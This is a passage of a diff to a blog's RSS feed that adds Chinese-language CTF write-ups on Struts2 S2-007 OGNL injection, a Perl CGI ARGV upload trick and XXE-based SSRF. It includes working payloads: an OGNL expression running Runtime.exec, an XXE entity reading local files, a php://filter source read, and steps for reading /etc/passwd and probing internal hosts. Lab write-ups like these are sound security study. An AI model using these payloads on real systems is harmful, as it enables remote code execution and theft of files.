class-name&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;\u0023myout&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getWriter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;\u0023mystr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bla&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;但是没有成功&lt;/p&gt;
+&lt;h3 id=&#34;281&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#281&#34;&gt;#&lt;/a&gt; 281：&lt;/h3&gt;
+&lt;h4 id=&#34;s2-007&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#s2-007&#34;&gt;#&lt;/a&gt; S2-007：&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;当配置了验证规则 `&amp;lt;ActionName&amp;gt;-validation.xml` 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;影响版本&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;Struts2 2.0.0 - Struts2 2.2.3 当配置了验证规则  &lt;code&gt;&amp;lt;ActionName&amp;gt;-validation.xml&lt;/code&gt;  时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;影响版本&lt;/strong&gt;：Struts2 2.0.0 - Struts2 2.2.3&lt;/p&gt;
+&lt;p&gt;poc:&lt;/p&gt;
+&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;#_memberAccess&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;allowStaticMethodAccess&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#foo&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;lang&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;Boolean&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;false&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;#context&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;xwork.MethodAccessor.denyMethodExecution&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;#foo&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@org.apache.commons.io.IOUtils&lt;/span&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@toString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@java.lang.Runtime&lt;/span&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@getRuntime&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token char&#34;&gt;&#39;id&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在 age 这里加入 poc&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241206102242369.png&#34; alt=&#34;image-20241206102242369&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获得 flag：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-libCATALINA_HOME=/usr/local/tomcatLANG=C.UTF-8HOSTNAME=528867081ea1OPENSSL_VERSION=1.1.0f-3TOMCAT_VERSION=8.5.20GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 713DA88BE50911535FE716F5208B0AB1D63011C7 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23JAVA_HOME=/docker-java-home/jreTOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-libTOMCAT_ASC_URL=https://www.apache.org/dist/tomcat/tomcat-8/v8.5.20/bin/apache-tomcat-8.5.20.tar.gz.ascJAVA_VERSION=8u141TOMCAT_TGZ_URL=https://www.apache.org/dyn/closer.cgi?action=download&amp;amp;filename=tomcat/tomcat-8/v8.5.20/bin/apache-tomcat-8.5.20.tar.gzPWD=/usr/local/tomcat/webappsHOME=/rootTOMCAT_TGZ_FALLBACK_URL=https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.20/bin/apache-tomcat-8.5.20.tar.gzCA_CERTIFICATES_JAVA_VERSION=20170531+nmu1TOMCAT_MAJOR=8JAVA_DEBIAN_VERSION=8u141-b15-1~deb9u1FLAG=ctfshow&amp;#123;603297bb-c2c4-45de-871c-1080654bec2a&amp;#125;SHLVL=0TOMCAT_ASC_FALLBACK_URL=https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.20/bin/apache-tomcat-8.5.20.tar.gz.ascPATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
+&lt;/code&gt;&lt;/pre&gt;
+ ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">http://odiws.github.io/2024/11/19/BSidesCF-2020-Cards/</guid>
             <title>[BSidesCF-2020]Cards</title>
             <link>http://odiws.github.io/2024/11/19/BSidesCF-2020-Cards/</link>
@@ -773,6 +852,37 @@ check=1
             <description><![CDATA[ &lt;h2 id=&#34;bsidescf-2019pick-tac-toe&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bsidescf-2019pick-tac-toe&#34;&gt;#&lt;/a&gt; [BSidesCF 2019]Pick Tac Toe&lt;/h2&gt;
 &lt;p&gt;基本上就是 ctrl+u（看见 /move 的路由，有一些 id，有 POST 方法，试一下 /move,POST:move=id）发现只能改一次，但是也够了用 move=r,i 第二行最后一个就行&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;../images/%5BRCTF2019%5DNextphp/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/10/15/CSAWQual2016-i-got-id/</guid>
+            <title>[CSAWQual2016]i_got_id</title>
+            <link>http://odiws.github.io/2024/10/15/CSAWQual2016-i-got-id/</link>
+            <category>buuctf，Perl后端文件上传</category>
+            <pubDate>Tue, 15 Oct 2024 14:15:57 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;csawqual2016i_got_id&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csawqual2016i_got_id&#34;&gt;#&lt;/a&gt; [CSAWQual2016]i_got_id&lt;/h2&gt;
+&lt;p&gt;开局三个超链接：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/IGotIt/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;helloworld 提示 perl：&lt;/p&gt;
+&lt;p&gt;Forms 登陆页面，没有有用的信息，正常显示，无二次注入点，SQL 注入，ssti 都没有&lt;/p&gt;
+&lt;p&gt;就是 files 上传文件了，可以发现要上传 perl 文件：&lt;/p&gt;
+&lt;p&gt;直接猜测后端代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight perl&#34;&gt;&lt;figcaption data-lang=&#34;perl&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt; strict&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt; warnings&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt; CGI&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$cgi&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; CGI&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;new&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$cgi&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;upload&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;file&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$cgi&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;param&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;file&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;$_&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;解释：&lt;/p&gt;
+&lt;p&gt;my $file= $cgi-&amp;gt;param( ‘file’ );：&lt;br&gt;
+param () 函数返回一个列表的文件。但是只有第一个文件会被放入 file 变量中。&lt;/p&gt;
+&lt;p&gt;while (&amp;lt;$file&amp;gt; ) 中，&amp;lt;&amp;gt; 不能处理字符串，除非是 ARGV，因此循环遍历并将每个值使用 open ()&lt;br&gt;
+ 调用。&lt;/p&gt;
+&lt;p&gt;对于读文件，如果传入一个 ARGV 的文件，那么 Perl 会将传入的参数作为文件名读出来。&lt;br&gt;
+所以，在上传的正常文件前加上一个文件上传项 ARGV，然后在 URL 中传入文件路径参数，就可以读取任意文件。&lt;/p&gt;
+&lt;p&gt;抓包：将里面的东西删除，复制 15，16 行空一行粘贴&lt;/p&gt;
+&lt;p&gt;第一个 ------- 删除 Content-Type，加的那个加上这个，在添加的地方前面加上 ARGV&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/IGotIt/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/IGotIt/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在 url 加上？cat+/etc/passwd (cat+/flag)(空格用 + 替代):&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/IGotIt/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后就出了：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/IGotIt/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：[CSAW 2016 I Got Id – Web200] i_got_id](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90c3VibG9ncy53b3JkcHJlc3MuY29tLzIwMTYvMDkvMTgvNjA2Lw==&#34;&gt;https://tsublogs.wordpress.com/2016/09/18/606/&lt;/span&gt;)&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -2302,6 +2412,84 @@ while True:
 &lt;li&gt;perl 语言的漏洞，管道符的利用&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/CAPD/p/17858896.html&#34;&gt;(&lt;em&gt;´∇｀&lt;/em&gt;) 欢迎回来！ (cnblogs.com)&lt;/a&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/05/29/cookbook-1/</guid>
+            <title>[nctf2019]truecookbook</title>
+            <link>http://odiws.github.io/2024/05/29/cookbook-1/</link>
+            <category>buuctf，xxe漏洞</category>
+            <pubDate>Wed, 29 May 2024 21:46:38 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;nctf2019true-xml-cookbook&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nctf2019true-xml-cookbook&#34;&gt;#&lt;/a&gt; [NCTF2019]True XML cookbook&lt;/h2&gt;
+&lt;h3 id=&#34;xxe漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xxe漏洞&#34;&gt;#&lt;/a&gt; xxe 漏洞：&lt;/h3&gt;
+&lt;p&gt;与 Fake XML Cookbook 一样的类型，比 fake 难一些&lt;/p&gt;
+&lt;p&gt;Fake XML Cookbook：&lt;/p&gt;
+&lt;p&gt;这个是直接 xxe 漏洞：&lt;/p&gt;
+&lt;!DOCTYPE note [
+  &lt;!ENTITY admin SYSTEM &#34;file:///flag&#34;&gt;
+&lt;p&gt;]&amp;gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;admin;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个不能这样做：因为没有反应，反正是读文件&lt;/p&gt;
+&lt;p&gt;这个读不了读别的：php:filter/convert.base64-encode/resource=doLogin.php&lt;/p&gt;
+&lt;p&gt;获取源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;//doLogin.php
+&amp;lt;?php\n/**
+* autor: c0ny1\n* date: 2018-2-7
+*/
+
+$USERNAME = &#39;admin&#39;; //\xe8\xb4\xa6\xe5\x8f\xb7
+$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //\xe5\xaf\x86\xe7\xa0\x81
+$result = null;
+libxml_disable_entity_loader(false);   // libxml_disable_entity_loader用于禁用或启用加载外部实体的功能。禁用（TRUE）或启用（FALSE）。
+$xmlfile = file_get_contents(&#39;php://input&#39;);
+try&amp;#123;
+	$dom = new DOMDocument();
+	$dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);   // loadXML() 方法通过解析一个 XML 标签字符串来组成该文档
+	$creds = simplexml_import_dom($dom);
+
+	$username = $creds-&amp;gt;username;
+	$password = $creds-&amp;gt;password;
+
+	if($username == $USERNAME &amp;amp;&amp;amp; $password == $PASSWORD)&amp;#123;
+		$result = sprintf(&amp;quot;&amp;lt;result&amp;gt;&amp;lt;code&amp;gt;%d&amp;lt;/code&amp;gt;&amp;lt;msg&amp;gt;%s&amp;lt;/msg&amp;gt;&amp;lt;/result&amp;gt;&amp;quot;,1,$username);
+	&amp;#125;else&amp;#123;       // sprintf() 函数把格式化的字符串写入变量中。
+		$result = sprintf(&amp;quot;&amp;lt;result&amp;gt;&amp;lt;code&amp;gt;%d&amp;lt;/code&amp;gt;&amp;lt;msg&amp;gt;%s&amp;lt;/msg&amp;gt;&amp;lt;/result&amp;gt;&amp;quot;,0,$username);
+	&amp;#125;	
+&amp;#125;catch(Exception $e)&amp;#123;
+	$result = sprintf(&amp;quot;&amp;lt;result&amp;gt;&amp;lt;code&amp;gt;%d&amp;lt;/code&amp;gt;&amp;lt;msg&amp;gt;%s&amp;lt;/msg&amp;gt;&amp;lt;/result&amp;gt;&amp;quot;,3,$e-&amp;gt;getMessage());
+&amp;#125;
+
+header(&#39;Content-Type: text/html; charset=utf-8&#39;);
+echo $result;
+?&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;simplexml_import_dom () 函数把 DOM 节点转换为 SimpleXMLElement 对象。获取 DOM 文档节点并转换为 SimpleXML 节点：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$dom=new domDocument;
+$dom-&amp;gt;loadXML(&amp;quot;&amp;lt;note&amp;gt;&amp;lt;to&amp;gt;Tove&amp;lt;/to&amp;gt;&amp;lt;from&amp;gt;Jani&amp;lt;/from&amp;gt;&amp;lt;/note&amp;gt;&amp;quot;);
+$x=simplexml_import_dom($dom);
+echo $x-&amp;gt;from;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;输出类似：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Jani
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;emm…… 没什么发现，但是读取源码的 payload 我还是在这里记录一哈。&lt;br&gt;
+这一次有所不同，上一题是我们读取文件得到 flag。这次是刺探存活的服务器；&lt;/p&gt;
+&lt;p&gt;其实很多人都小看了 xxe 漏洞，觉得它只可以读读文件啊什么的，其实大错特错，它还可以访问内网的主机，和 ssrf 利用的 dict 伪协议一样，都可以刺探存活的主机并且链接访问；也可以看作这个题是在打内网；&lt;/p&gt;
+&lt;p&gt;好的我们老样子，我们利用 ssrf 读内网文件。先用 file 协议读取相关的文件 /etc/passwd 和 /etc/hosts；当我们读取到 hosts 文件的时候，我们会发现有几个 ip 地址，我们便来访问一下，（到这里应该可以猜到是在打内网了）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;只能想到利用xxe进行ssrf打内网，扫描一下内网ip的几个文件：/etc/hosts，/proc/net/arp，/proc/net/fib_trie
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DTrueXMLcookbook/2.png&#34; alt=&#34;2&#34;&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DTrueXMLcookbook/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后就是找内网服务器了：读这个 http://173.113.242.10&lt;/p&gt;
+&lt;p&gt;没找到，还在报错&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DTrueXMLcookbook/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;换个服务器&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE3My4xMTMuMjQyLjEx&#34;&gt;http://173.113.242.11&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DTrueXMLcookbook/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获取 flag，完成啦&lt;/p&gt;
  ]]></description>
         </item>
         <item>
